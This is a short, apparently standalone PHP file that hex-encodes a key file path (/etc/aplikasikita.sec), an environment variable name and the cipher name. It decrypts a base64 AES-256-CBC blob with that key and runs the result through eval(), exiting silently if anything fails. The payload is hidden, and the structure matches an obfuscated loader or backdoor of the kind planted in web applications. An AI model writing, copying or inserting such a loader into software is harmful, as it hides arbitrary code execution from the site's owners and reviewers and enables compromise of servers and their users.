<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('IiNnLA6xtqgRV2PJeBwE8Q==');

$c=base64_decode(

'jFb83pv+6yUq9i/+n3pV21s19in/UiZVAse28T2bjotSClBYYVMS34H4fII+UDuzm4HT4fnmusLz' .
'CHF5ykMeeik3Ja2eTACwNwnGs5r6suXH8VyIaQI8uGY5g/EIAFW8Pl5Un58JCsUU1PMvlrGXD3zB' .
'ISFZIL/DTAl+IdKoj1Wr4DCsy4dQJ0/9NqvZ7c1dMU3iVaxdGyvfH6brCM+hqxqBJlhm/HyzWP5C' .
'WbCqxE5nxrmaKm0b9KexOVVUNppsVMnwtUVwDUMq/tQoj6hrWOCa5D+S/0k77fnZfw3uNdaI1JEK' .
'1pv2AmzdgPk6P/RCbJC6PzjVptkIdAlb0mmoAu6yUIbsCLurr40Ch1SX0kr27s7tthVBTAqtmn7A' .
'sx5UatqFyTwiNOOIVCC8Z9X2yex7JiILz9hopWB6c7gy/6bYFilSZCjojL1/t9r6YDv3xca9qgvQ' .
'7wpbrEbw70tMF7vo/X/WgZGxoQG1GvtrWrEYaRHQVrHi/yGkyM3eWbvisLV+FPiCcXuKRrhcgzkR' .
'EvUnLudD6ZCkIcAGGi7XdbRyBh5cGRHhBmtvMRp0CXPUM16/j9StR7ndYCJBplpkK6ch2D/W62Zm' .
'kjlGxcxTegh5RzcEDcRfO/ux9L7NAA/tSNFBZEtkJ0PdjIZl2KQMZJEHFHwMga1m/FDugtPXQhvx' .
'eHXnvjjjD+PrfY1x1dXUuZVoZEliQEzxuY6oQeXNWw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

